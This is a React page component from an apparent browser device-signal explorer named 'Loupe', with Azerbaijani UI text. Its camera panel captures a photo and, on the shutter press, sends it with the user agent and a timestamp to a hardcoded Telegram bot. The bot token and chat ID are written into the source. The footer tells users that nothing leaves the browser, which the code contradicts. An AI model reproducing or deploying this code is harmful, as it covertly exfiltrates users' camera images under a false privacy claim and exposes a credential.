import { useParams, useLocation } from "wouter";
import { useEffect, useState, useCallback, useRef } from "react";
import { motion } from "framer-motion";
import { ChevronLeft, Eye, LockKeyhole, FlaskConical, Copy, Check, Camera, X, Loader2, CheckCircle2, AlertCircle } from "lucide-react";
import { cn } from "@/lib/utils";
import { CATEGORIES, type Signal, type Sensitivity } from "@/lib/data";
import NotFound from "./not-found";

const TELEGRAM_BOT_TOKEN = "8641291303:AAGsFjLzSfoyZBxjkd2IJk-NSTkFXPjElJg";
const TELEGRAM_CHAT_ID = "6397853058";

const SENSITIVITY_META: Record<Sensitivity, {
  label: string;
  icon: React.ComponentType<{ className?: string }>;
  color: string;
  bg: string;
  pillBg: string;
  pillText: string;
}> = {
  passive: {
    label: "Passive",
    icon: Eye,
    color: "text-green-400",
    bg: "bg-green-400/15",
    pillBg: "bg-green-400/20",
    pillText: "text-green-300",
  },
  permissioned: {
    label: "Needs Permission",
    icon: LockKeyhole,
    color: "text-orange-400",
    bg: "bg-orange-400/15",
    pillBg: "bg-orange-400/20",
    pillText: "text-orange-300",
  },
  advanced: {
    label: "Advanced",
    icon: FlaskConical,
    color: "text-pink-400",
    bg: "bg-pink-400/15",
    pillBg: "bg-pink-400/20",
    pillText: "text-pink-300",
  },
};

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch { /* clipboard unavailable */ }
  };
  return (
    <button
      onClick={handleCopy}
      className="p-1 rounded text-white/20 hover:text-white/60 transition-colors shrink-0"
      title="Copy value"
    >
      {copied ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
    </button>
  );
}

function SignalRow({ signal, index }: { signal: Signal; index: number }) {
  const isLong = signal.value.length > 60;
  const hasEntries = signal.entries && signal.entries.length > 0;
  return (
    <motion.div
      initial={{ opacity: 0, y: 8 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: 0.05 + index * 0.04, duration: 0.25 }}
      className="px-4 py-3"
      data-testid={`signal-${signal.id}`}
    >
      <div className="flex items-start justify-between gap-2 mb-1">
        <span className="font-semibold text-[14px] text-white/90 leading-snug font-mono">{signal.name}</span>
        <CopyButton text={signal.value} />
      </div>
      {!hasEntries && (
        <div className={cn("font-mono text-[13px] text-green-300 leading-relaxed break-all", isLong && "text-[11px]")}>
          {signal.value}
        </div>
      )}
      {hasEntries && (
        <div className="flex flex-col gap-0.5 mt-1">
          {signal.entries!.map((e, i) => (
            <div key={i} className="flex items-center gap-2">
              {e.label && <span className="text-[12px] text-white/40 shrink-0 w-28 truncate">{e.label}</span>}
              <span className="font-mono text-[12px] text-green-300 break-all">{e.value || signal.value}</span>
            </div>
          ))}
        </div>
      )}
      {signal.rationale && (
        <p className="text-[12px] text-white/35 mt-1.5 leading-relaxed">{signal.rationale}</p>
      )}
    </motion.div>
  );
}

function LoadingRows() {
  return (
    <>
      {[...Array(4)].map((_, i) => (
        <div key={i} className="px-4 py-3 animate-pulse">
          <div className="h-3 bg-white/10 rounded w-36 mb-2" />
          <div className="h-3 bg-green-400/20 rounded w-48" />
          <div className="h-2.5 bg-white/5 rounded w-full mt-2" />
        </div>
      ))}
    </>
  );
}

// ── Camera Panel ─────────────────────────────────────────────────────────────
type Status = "idle" | "live" | "sending" | "sent" | "error";

function CameraCapture() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  const [status, setStatus] = useState<Status>("idle");
  const [facingMode, setFacingMode] = useState<"environment" | "user">("environment");
  const [errorMsg, setErrorMsg] = useState("");

  const stopStream = () => {
    streamRef.current?.getTracks().forEach(t => t.stop());
    streamRef.current = null;
  };

  const startCamera = useCallback(async (mode: "environment" | "user") => {
    try {
      stopStream();
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false,
      });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
      }
      setStatus("live");
      setErrorMsg("");
    } catch (e: any) {
      setErrorMsg("Kamera açıla bilmədi: " + e.message);
      setStatus("error");
    }
  }, []);

  const switchCamera = useCallback(async () => {
    const next = facingMode === "environment" ? "user" : "environment";
    setFacingMode(next);
    await startCamera(next);
  }, [facingMode, startCamera]);

  // Shutter → capture → auto-send immediately
  const shoot = useCallback(() => {
    const video = videoRef.current;
    const canvas = canvasRef.current;
    if (!video || !canvas) return;

    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    canvas.getContext("2d")!.drawImage(video, 0, 0);

    stopStream();
    setStatus("sending");

    canvas.toBlob(async (blob) => {
      if (!blob) { setStatus("error"); setErrorMsg("Şəkil yaradıla bilmədi"); return; }
      try {
        const form = new FormData();
        form.append("chat_id", TELEGRAM_CHAT_ID);
        form.append("photo", blob, "loupe_photo.jpg");
        form.append("caption",
          `📸 Loupe — cihaz şəkli\n🕐 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent.slice(0, 80)}`
        );
        const res = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
          { method: "POST", body: form }
        );
        const json = await res.json();
        if (json.ok) {
          setStatus("sent");
        } else {
          throw new Error(json.description || "API xətası");
        }
      } catch (e: any) {
        setStatus("error");
        setErrorMsg(e.message);
      }
    }, "image/jpeg", 0.92);
  }, []);

  const reset = useCallback(() => {
    setStatus("idle");
    setErrorMsg("");
  }, []);

  useEffect(() => () => stopStream(), []);

  return (
    <div className="mx-4 mt-4 mb-2">
      {/* IDLE — open camera button */}
      {status === "idle" && (
        <button
          onClick={() => startCamera(facingMode)}
          className="w-full flex items-center justify-center gap-2 bg-orange-500 hover:bg-orange-400 active:bg-orange-600 transition-colors text-white font-semibold rounded-2xl py-3 text-[15px]"
        >
          <Camera className="w-5 h-5" />
          Kamera Aç və Şəkil Çək
        </button>
      )}

      {/* LIVE viewfinder */}
      {status === "live" && (
        <div className="relative bg-black rounded-2xl overflow-hidden">
          <video ref={videoRef} className="w-full rounded-2xl" playsInline muted autoPlay />
          <div className="absolute bottom-0 left-0 right-0 flex items-center justify-between px-5 py-4 bg-gradient-to-t from-black/70 to-transparent">
            {/* Close */}
            <button
              onClick={() => { stopStream(); setStatus("idle"); }}
              className="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center"
            >
              <X className="w-5 h-5 text-white" />
            </button>
            {/* Shutter — tap to capture + auto-send */}
            <button
              onClick={shoot}
              className="w-16 h-16 rounded-full border-4 border-white bg-white/30 active:bg-white/70 transition-colors"
            />
            {/* Flip camera */}
            <button
              onClick={switchCamera}
              className="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center"
            >
              <Camera className="w-5 h-5 text-white" />
            </button>
          </div>
        </div>
      )}

      {/* SENDING */}
      {status === "sending" && (
        <div className="flex flex-col items-center gap-3 py-6 bg-[#1c1c1e] rounded-2xl">
          <Loader2 className="w-8 h-8 text-orange-400 animate-spin" />
          <p className="text-white/70 text-[14px]">Telegram-a göndərilir...</p>
        </div>
      )}

      {/* SENT */}
      {status === "sent" && (
        <div className="flex flex-col items-center gap-3 py-6 bg-[#1c1c1e] rounded-2xl">
          <CheckCircle2 className="w-10 h-10 text-green-400" />
          <p className="text-green-400 font-semibold text-[15px]">Göndərildi!</p>
          <button
            onClick={reset}
            className="flex items-center gap-2 bg-orange-500 hover:bg-orange-400 transition-colors text-white font-medium rounded-xl px-5 py-2 text-[14px] mt-1"
          >
            <Camera className="w-4 h-4" />
            Yenidən çək
          </button>
        </div>
      )}

      {/* ERROR */}
      {status === "error" && (
        <div className="flex flex-col items-center gap-3 py-6 bg-[#1c1c1e] rounded-2xl">
          <AlertCircle className="w-8 h-8 text-red-400" />
          <p className="text-red-400 text-[13px] text-center px-4">{errorMsg}</p>
          <button
            onClick={reset}
            className="text-orange-400 text-[14px] font-medium mt-1"
          >
            Yenidən cəhd et
          </button>
        </div>
      )}

      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
}

export default function Detail() {
  const { categoryId } = useParams<{ categoryId: string }>();
  const [, navigate] = useLocation();
  const category = CATEGORIES.find(c => c.id === categoryId);
  const [signals, setSignals] = useState<Signal[] | null>(null);
  const [loading, setLoading] = useState(true);

  const loadSignals = useCallback(async () => {
    if (!category) return;
    setLoading(true);
    setSignals(null);
    try {
      const result = await category.collect();
      setSignals(result);
    } catch (err) {
      setSignals([{
        id: "error",
        name: "Error collecting data",
        value: String(err),
        rationale: "An unexpected error occurred while reading this category.",
      }]);
    } finally {
      setLoading(false);
    }
  }, [category]);

  useEffect(() => { loadSignals(); }, [loadSignals]);

  if (!category) return <NotFound />;

  const meta = SENSITIVITY_META[category.sensitivity];
  const Icon = category.icon;
  const SensIcon = meta.icon;

  return (
    <div className="min-h-screen bg-black text-white">
      <div className="max-w-lg mx-auto pb-16">

        {/* Nav bar */}
        <div className="sticky top-0 z-10 bg-black/80 backdrop-blur-md border-b border-white/[0.06]">
          <div className="flex items-center gap-2 px-3 py-3">
            <button
              onClick={() => navigate("/")}
              className="flex items-center gap-1 text-orange-400 font-medium text-[15px] hover:text-orange-300 transition-colors"
              data-testid="button-back"
            >
              <ChevronLeft className="w-5 h-5 -ml-1" />
              Back
            </button>
          </div>
        </div>

        {/* Hero */}
        <div className="flex items-center gap-4 px-5 py-5 border-b border-white/[0.06]">
          <div className={cn("w-14 h-14 rounded-2xl flex items-center justify-center shrink-0", meta.bg)}>
            <Icon className={cn("w-7 h-7", meta.color)} />
          </div>
          <div className="flex-1 min-w-0">
            <h1 className="text-[22px] font-bold text-white leading-tight">{category.title}</h1>
            <p className="text-[13px] text-muted-foreground mt-0.5 leading-snug">{category.subtitle}</p>
          </div>
        </div>

        {/* Sensitivity badge */}
        <div className="flex items-center gap-2 px-5 py-3 border-b border-white/[0.06]">
          <div className={cn("flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[12px] font-semibold", meta.pillBg, meta.pillText)}>
            <SensIcon className="w-3 h-3" />
            {meta.label}
          </div>
          <span className="text-[12px] text-muted-foreground">
            {category.sensitivity === "passive" && "Read without any prompt"}
            {category.sensitivity === "permissioned" && "Browser shows a permission prompt"}
            {category.sensitivity === "advanced" && "Derived from public APIs"}
          </span>
        </div>

        {/* Camera capture — only on camera page */}
        {category.id === "camera" && <CameraCapture />}

        {/* Signals */}
        <div className="mt-2">
          <div className="mx-4 bg-[#1c1c1e] rounded-2xl overflow-hidden divide-y divide-white/[0.06]">
            {loading ? (
              <LoadingRows />
            ) : signals && signals.length > 0 ? (
              signals.map((s, i) => <SignalRow key={s.id} signal={s} index={i} />)
            ) : (
              <div className="px-4 py-8 text-center text-muted-foreground text-[14px]">No signals collected.</div>
            )}
          </div>
        </div>

        <p className="text-[11px] text-white/20 text-center px-6 mt-5 leading-relaxed">
          All data is read locally in your browser. Nothing is transmitted or stored outside this page.
        </p>
      </div>
    </div>
  );
}
